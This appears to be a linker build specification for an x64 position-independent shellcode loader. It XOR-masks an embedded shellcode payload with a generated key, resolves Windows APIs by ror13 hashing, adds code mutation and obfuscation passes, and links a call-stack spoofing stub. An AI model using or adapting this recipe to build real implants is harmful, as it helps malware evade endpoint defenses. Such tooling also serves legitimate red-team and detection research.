x64:
    load "bin/loader.x64.o"
        make pic +gofirst +relax +disco +blockparty +regdance +mutate +optimize

    load "bin/services.x64.o"
        merge

    load "bin/shellwriter.x64.o"
        merge

    load "bin/resource.x64.o"
        merge

    load "bin/spoof.x64.o"
        merge

    load "bin/draugr.x64.bin"
        linkfunc "draugr_stub"

    fixbss "getBSS"

    linkpost "pdata" "unwind"

    dfr "resolve" "ror13" "KERNEL32, KERNELBASE, NTDLL"
    dfr "resolve_ext" "strings"

    mergelib "../tcg/libtcg/libtcg.x64.zip"

    generate $KEY 64

    push $KEY
        preplen
        link "mask"

    push $SC
        mask "xor" $KEY
        preplen
        link "sc"

    export